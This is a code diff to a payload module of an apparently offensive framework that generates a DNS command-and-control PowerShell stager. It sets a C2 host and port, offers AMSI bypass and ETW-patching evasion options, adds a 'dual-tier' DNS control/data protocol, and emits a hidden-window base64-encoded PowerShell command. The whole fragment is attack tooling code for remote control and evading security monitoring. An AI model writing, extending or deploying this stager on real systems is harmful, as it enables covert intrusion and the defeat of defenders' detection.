@@ -29,6 +29,7 @@ class Module(Payload):
 	lhost = OptString("127.0.0.1", "DNS server address (C2 host)", True)
 	lport = OptPort(53, "DNS server port", True)
 	poll_interval = OptInteger(5, "Poll interval seconds", False)
+	dual_tier = OptBool(True, "Use ks.v1 control/data dual-tier DNS protocol", False)
 	bypass_amsi = OptBool(False, "Prepend AMSI bypass", False, True)
 	patch_etw = OptBool(False, "Patch EtwEventWrite", False, True)
 
@@ -51,6 +52,7 @@ class Module(Payload):
 			str(self.lhost),
 			int(self.lport),
 			float(getattr(getattr(self, "poll_interval", None), "value", self.poll_interval) or 5),
+			dual_tier=bool(getattr(getattr(self, "dual_tier", None), "value", getattr(self, "dual_tier", True))),
 		)
 
 		from lib.c2.stager_evasion import powershell_prelude
@@ -59,5 +61,4 @@ class Module(Payload):
 			bypass_amsi=bool(self.bypass_amsi),
 			patch_etw=bool(self.patch_etw),
 		) + script
-		encoded = base64.b64encode(full.encode("utf-16le")).decode("ascii")
-		return f"powershell -nop -w hidden -EncodedCommand {encoded}"
+		return self._encode_powershell_command(full, window_style="hidden")
